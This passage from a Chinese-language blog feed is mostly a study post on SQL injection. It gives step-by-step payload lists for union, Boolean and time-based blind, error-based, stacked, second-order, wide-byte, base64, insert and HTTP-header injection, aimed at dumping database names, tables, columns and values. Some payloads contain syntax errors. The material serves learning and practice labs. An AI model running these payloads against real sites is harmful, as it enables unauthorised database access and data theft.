4,页面返回与id&#x3D;1不同的结果，则说明不存在第四行，所以行数为三行。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727120518311.png" class="" title="image-20240727120518311"><p>由于是将数据输出到页面上的，所以可以使用联合查询（union注入），并通过order by查询结果，我们可以通过访问以下内容来查看查看回显。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2,3--+</span><br><span class="line"></span><br><span class="line">#这里的+会被解析成空格，使注释符后的内容不被解析，同理，--%20也一样，或者将#换成%23也一样。</span><br><span class="line">#id=-1的原因是因为数据库中没有id=-1的数据，所以我们将id的值变成-1，那么回显就会显示我们union select查询的结果。</span><br></pre></td></tr></table></figure><p>查看回显时如果返回了2：3，说明可以在2和3的位置输入mysql语句，比如使用database（），可以查看返回的数据库信息（这里的返回信息是数据库类型），之后就可以获取数据了。</p><p>获取库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line"></span><br><span class="line">#这里的group_concat是将数据库中的内容拼接成一行回显。</span><br></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#limit 0,1获取的是第一行的表名，如果要获取第二行的表名，结合前边提到的limit的使用，就使用limit 1,1。</span><br><span class="line">#如果想要全部回显，就是用前边提到的group_concat函数。</span><br></pre></td></tr></table></figure><p>获取字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#获取其他字段名和上述步骤同理</span><br></pre></td></tr></table></figure><p>获取字段数据</p><p>拿到库名，表名和字段名之后，我们就可以构造SQL语句获取具体的值了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username_id from mysql.usernames limit 0,1</span><br></pre></td></tr></table></figure><p>这里把相关查询语句总结放在这里（Union注入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">id=1 order by 4</span><br><span class="line"></span><br><span class="line">#确定位置,后续语句将1，2，3中某个可用数字更改为(该语句)</span><br><span class="line">id=-1&#x27; union select 1,2,3</span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1            </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">select username_id from mysql.usernames limit 0,1</span><br></pre></td></tr></table></figure><h2 id="布尔盲注-Boolean"><a href="#布尔盲注-Boolean" class="headerlink" title="布尔盲注(Boolean)"></a>布尔盲注(Boolean)</h2><h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><p><strong>判断长度</strong></p><p>首先通过在id&#x3D;1后边添加单引号来判断是否存在SQL注入，之后在通过拼接and 1&#x3D;1%23和and 2&#x3D;2%23再次查看（这里%23是#注释符，用于将后边代码命令注释掉）。</p><p>如果发现返回包中的返回结果只有yes或者no说明，无法返回数据，只能返回yes或者no，那么合理我们就只能使用Boolean盲注。</p><p>首先来判断数据库名长度，id&#x3D;1后拼接以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and length(database())=1--+ </span><br><span class="line"></span><br><span class="line">#有单引号所以需要注释符来注释，1的位置上可以是任何数字，这里用不同的数字查看返回的结果，如果是yes说明长度是该数字，如果是no说明长度不是该数字。（这里数字的含义是大于等于该数字）</span><br></pre></td></tr></table></figure><p><strong>查询库名</strong></p><p>接着逐字符判断的方式来获取数据库库名，数据库苦命范围一般在a<del>z，0</del>9之间，可能会加一些特殊字符，字母不区分大小写，相关语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(database(),1,1)=&#x27;m&#x27;--+</span><br><span class="line"></span><br><span class="line">#这里的substr意思是截取database()的值，从第一个字符开始，每次返回一个。</span><br><span class="line">#substr和limit不一样，substr是从1开始排序，而limit是从0开始排序</span><br></pre></td></tr></table></figure><p>之后使用burp的爆破功能爆破其中的’t’的值，通过返回包返回yes或者no来判断是否是该值。</p><p>也可以使用ASCII码的方式进行查询，s的ASCII码是115，mysql的ASCII转换函数是ascii()，那么语句就可以改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><p>那么后边的数据库库名就可以逐步判断了，假如我们前边判断库名长度为5，那么就要往后判断5位，相关语句也要修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(database(),2,1)=&#x27;y&#x27;--+</span><br><span class="line"></span><br><span class="line">#我们在这里判断第几位，database()后的数字就修改成几</span><br></pre></td></tr></table></figure><p><strong>查询表名</strong></p><p>之前查询库名我们在语句中使用了database(),那么我们查询表明就将相应位置替换为查询表名的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br></pre></td></tr></table></figure><p>那么完整的语句就应该更改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1)=&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure><p>那么用这种方法我们很快就可以查出所有的表名和字段名。</p><p>这里把相关查询语句总结放在这里（Boolean盲注）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">&#x27; and length(database())=1--+ </span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">&#x27; and substr(database(),1,1)=&#x27;库名第一位&#x27;--+                 #第一种</span><br><span class="line"></span><br><span class="line">&#x27; and substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&#x27;库名第一位&#x27;                                 #第二种</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1)=&#x27;表名第一位&#x27;--+</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),1,1)=&#x27;字段名第一位&#x27;--+                </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">&#x27; and substr((select username_id from mysql.usernames limit 0,1),1,1)=&#x27;字段名第一位&#x27;--+      </span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h3><p>如果访问的场景url后缀为?username&#x3D;1之类的，我们在参数后边拼接’，在数据库执行语句时会因为语法错误报错，输出到页面的结果输出报错信息。</p><p>报错注入的格式很多（<a href="http://t.csdnimg.cn/KwGiT%EF%BC%89%E8%BF%99%E9%87%8C%E7%94%A8updatexml()%E6%BC%94%E7%A4%BA">http://t.csdnimg.cn/KwGiT）这里用updatexml()演示</a></p><p>获取use()<strong>的值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#这里的0x7e是ASCII编码，解码结果为~。所以这里返回包的信息应该是~username~</span><br></pre></td></tr></table></figure><p><strong>获取库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>之后可以使用select语句获取库名，表明字段名，查询语句与union注入的相同，因为报错注入只显示一条结果，所以需要使用limit语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取use()值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  #方法一</span><br><span class="line"></span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select schema_name from         information_schema.schemata limit 0,1),0x7e),1)--+             #方法二</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select username_id from mysql.usernames limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注与布尔盲注很像，首先在url的id&#x3D;1后拼接单引号查看返回包，如果返回的是no，说明只能返回yes或者no，那我们除了布尔盲注外可以通过查看bp里repeater返回包右下角的响应时间来做判断。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240729212148274.png" class="" title="image-20240729212148274"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#1秒=1000毫秒</span><br></pre></td></tr></table></figure><h3 id="流程-3"><a href="#流程-3" class="headerlink" title="流程"></a>流程</h3><p><strong>查询库名长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (length(database())&gt;1,sleep(5),1)</span><br><span class="line"></span><br><span class="line">#意思是如果数据库库名长度大于1，吧呢么MySQL查询休眠5秒，否则查询1，之后就可以通过返回包响应时间来做判断</span><br><span class="line"></span><br><span class="line">if (length(database())&gt;10,sleep(5),1)</span><br><span class="line">#如果把数句酷库名长度改为大于10，返回的时间极少，说明语句被成功执行，说明数据库库名长度不大于10</span><br></pre></td></tr></table></figure><p>之后就可以执行库名等的查询了，语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#查询库名（通过查看返回包的响应式时间来判断字母对不对）</span><br><span class="line">if(substr(database()1,1)=&#x27;s&#x27;,sleep(5),1)           #方法一</span><br><span class="line">if(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=&#x27;s&#x27;,sleep(5),1)                         #方法二</span><br><span class="line"></span><br><span class="line">#查询表名</span><br><span class="line">if(substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1))=&#x27;s&#x27;,sleep(5),1) </span><br><span class="line"></span><br><span class="line">#查询字段名</span><br><span class="line">if(substr((select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1)</span><br><span class="line"></span><br><span class="line">#查询值</span><br><span class="line">if(substr((select username_id from mysql.usernames limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1) </span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠查询可以执行多条语句，多语句之间用分号隔开，堆叠注入就是使用这个特点，在第二个SQL语句中构造自己要执行的语句。</p><h3 id="流程-4"><a href="#流程-4" class="headerlink" title="流程"></a>流程</h3><p>首先访问id&#x3D;1’,页面返回mysql错误，再访问id&#x3D;1’%23,页面返回正常结果，这里就可以使用布尔盲注，时间注入和堆叠注入。</p><p><strong>获取user()值语句</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;select if(substr(user()1,1)=&#x27;s&#x27;,sleep(3),1)%23</span><br><span class="line"></span><br><span class="line">#所以堆叠注入就是&#x27;; select后加时间注入的语句</span><br></pre></td></tr></table></figure><p>那么相应的构造语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">&#x27;; select if (length(database())&gt;1,sleep(3),1)%23</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27;; select if(substr(database()1,1)=&#x27;s&#x27;,sleep(3),1)%23          #方法一</span><br><span class="line"></span><br><span class="line">&#x27;; selectif(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=&#x27;s&#x27;,sleep(3),1)%23#方法二</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27;; select if(substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1))=&#x27;s&#x27;,sleep(3),1)%23</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27;; select if(substr((select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1)%23</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27;; select if(substr((select username_id from mysql.usernames limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1)%23</span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入场景假设：两个页面，页面一（1.php）功能是注册用户名，也是插入SQL语句的地方，页面二（2.php）功能是通过参数ID读取用户名和用户信息。</p><h3 id="流程-5"><a href="#流程-5" class="headerlink" title="流程"></a>流程</h3><p>访问1.php?username&#x3D;test’,结果返回一个id号为21，这说明用户名test‘对应的id为21，那么我们去另一个页面访问2.php?id&#x3D;21,如果返回了Mysql的错误，说明这里大概率存在SQL注入。</p><p>我们回到第一个页面访问1.php?username&#x3D;test’ order by 1%23，拿到新的id&#x3D;32，之后带着新的id&#x3D;32去访问页面2.php?id&#x3D;32，返回空白页面。</p><p>这时我们再拿一个新的id，访问1.php?username&#x3D;test’ order by 10%23，拿到一个新的id&#x3D;33，之后拿着id&#x3D;33去访问页面2.php?id&#x3D;33，如果返回Mysql报错（Unknown column ‘10’ in ‘order clause’）,说明之前的空白页面是正常返回，之后重复order by来判断字段数量。</p><p>假设这里有三个字段，我们通过访问2.php?username&#x3D;test’ union select 1,2,3%23,获取到新的id&#x3D;39，之后访问2.php?id&#x3D;39,发现返回union select中的2和3字段。</p><p>那么之后我们就可以在2和3的位置插入查询语句，比如访问1.php?id&#x3D;test’ union select 1,user(),3%23，获取新的id&#x3D;40，得到user()的结果。</p><p>查询语句与联合注入相同，只是查看返回结果时，要拿1.php页面的id号去2.php查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">id=1 order by 4</span><br><span class="line"></span><br><span class="line">#确定位置,后续语句将1，2，3中某个可用数字更改为(该语句)</span><br><span class="line">id=-1&#x27; union select 1,2,3</span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1            </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">select username_id from mysql.usernames limit 0,1</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>当出现以下场景：</p><p>当访问id&#x3D;1’返回的结果没有报错，而是返回了查询语句并将’前加入了一个转义符\，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where id=&#x27;1\&#x27;&#x27; limit 0,1</span><br></pre></td></tr></table></figure><p>此处说明参数id&#x3D;1在数据库查询时是被单引号包围的，当传入id&#x3D;1’时，传入的单引号被\转义，导致参数ID无法逃逸单引号的包围，所以一般情况下，此处是不存在SQL注入漏洞的，但是有一个特例，当数据库编码为GBK时，可以使用宽字节注入。</p><p>宽字节注入格式是在地址后加一个%df，再加单引号，因为反斜杠的编码是%5c,而在GBK编码中，%df%5c是繁体字’縗’,所以这时，单引号成功逃逸，爆出mysql数据库错误。</p><p>由于输入的参数id&#x3D;1’，导致SQL语句多了一个单引号，所以需要使用注释符来注释自身的单引号，访问id&#x3D;1%df%23,，此时\和%df一起被转义了，所以单引号成功逃逸，SQL语句就符合语法规范。</p><p>之后就可以结合union注入的语句进行查询了，但是格式需要作出一定的改变</p><h3 id="流程-6"><a href="#流程-6" class="headerlink" title="流程"></a>流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#判断注入</span><br><span class="line">id=1%df&#x27; and 1=1%23      #为真时返回结果，返回查询语句</span><br><span class="line">id=1%df&#x27; and 1=2%23      #为假时不返回结果，只返回查询语句</span><br><span class="line"></span><br><span class="line">#查询字段数量</span><br><span class="line">id=1%df&#x27; order by 3%23</span><br><span class="line"></span><br><span class="line">#确定返回位置</span><br><span class="line">id=1%df&#x27; union select 1,2,3%23</span><br><span class="line"></span><br><span class="line">#获取库名,后续语句则是将user(),修改为(该语句)</span><br><span class="line">id=-1%df&#x27; union select 1,user(),3,%23</span><br><span class="line"></span><br><span class="line">#获取表名,单引号被转义，所以这里嵌套查询</span><br><span class="line">select table_name from information_schema.tables where tables_schema=(select database()) limit 0,1%23</span><br><span class="line"></span><br><span class="line">#获取字段名，这里使用了三层嵌套，第一层是table_schema，他代表苦命的嵌套，第二层和第三层是table_name的嵌套，我们可以看到语句中有两个limit，前一个limit控制表名的顺序，后一个limit控制字段名的顺序</span><br><span class="line">select column_name from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1)limit 0,1</span><br></pre></td></tr></table></figure><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>总体流程和union注入一样，不一样的点在于，不是在url处返回id&#x3D;1，而是在cookie处返回url等于1。</p><h2 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h2><p>总体流程和union注入一样，不一样的点在于，ID参数被base64位编码了，我们的查询语句要经过base64位编码。(%3d是url编码)</p><h3 id="流程-7"><a href="#流程-7" class="headerlink" title="流程"></a>流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">id=MSBvcmRlciBieSA0</span><br><span class="line"></span><br><span class="line">#确定位置,后续语句将1，2，3中某个可用数字更改为(该语句)</span><br><span class="line">id=LTEnIHVuaW9uIHNlbGVjdCAxLDIsMw==      </span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">c2VsZWN0IFNDSEVNQV9OQU1FIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLlNDSEVNQVRBIGxpbWl0IDAsMQ==</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">c2VsZWN0IHRhYmxlX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nbXlzcWwnIGxpbWl0IDAsMQ==</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">c2VsZWN0IGNvbHVtbl9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPSdteXNxbCcgYW5kIHRhYmxlX25hbWU9J3VzZXJuYW1lcycgbGltaXQgMCwxICAgIA==        </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">c2VsZWN0IHVzZXJuYW1lX2lkIGZyb20gbXlzcWwudXNlcm5hbWVzIGxpbWl0IDAsMQ==</span><br></pre></td></tr></table></figure><h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><p>和报错注入大差不差，但是取消了注释符，换成了and’或者or’</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#获取use()值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and&#x27;  </span><br><span class="line">                                                   #方法一(获取当前库名)</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),1，31),0x7e),1) and&#x27;     </span><br><span class="line">                                                 #方法二(获取当前所有库名)</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),1,30),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27;),1,30),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(ipaddress) from httpinfo),1,30),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">##substr在使用时，结尾数字如果是1,30的话，我们使用31,30就可以把剩余的内容显示出来</span><br></pre></td></tr></table></figure><h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><p>如果http头部参数例如User-agent，Referer，XFF，cookie等地方</p><h3 id="UA头注入"><a href="#UA头注入" class="headerlink" title="UA头注入"></a>UA头注入</h3><p>这是一种基于insert注入的场景，添加’看是否报错判断是否存在注入点，之后使用insert注入的payload来进行sql测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27; and updatexml(1,concat(&#x27;~&#x27;,database()),1) and &#x27;</span><br></pre></td></tr></table></figure><h3 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h3><p>和UA头差不多，只是位置换成了Referer的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; and updatexml(1,concat(&#x27;~&#x27;,database()),1) and &#x27;</span><br></pre></td></tr></table></figure><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>也差不多，但是换个位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie：user=admin &#x27; and updatexml(1,concat(&#x27;~&#x27;,database()),1) and &#x27;</span><br></pre></td></tr></table></figure><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>如果http请求头有一个头部参数为X-Forwarded-for(简称XFF头)，他代表了客户端真实ip，通过修改XFF值可以伪造客户端ip，如果将XFF设置为127.0.0.1，然后访问该url页面返回正常。</p><p>之后尝试将127.0.0.1加上’,即127.0.0.1’再次访问，页面返回报错信息，之后通过and 1&#x3D;1#和and 1&#x3D;2#再次访问判断是否存在SQL注入，之后使用union注入的方法完成注入。</p>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly主题美化</title>
      <link href="/2024/07/17/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"/>
      <url>/2024/07/17/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
      
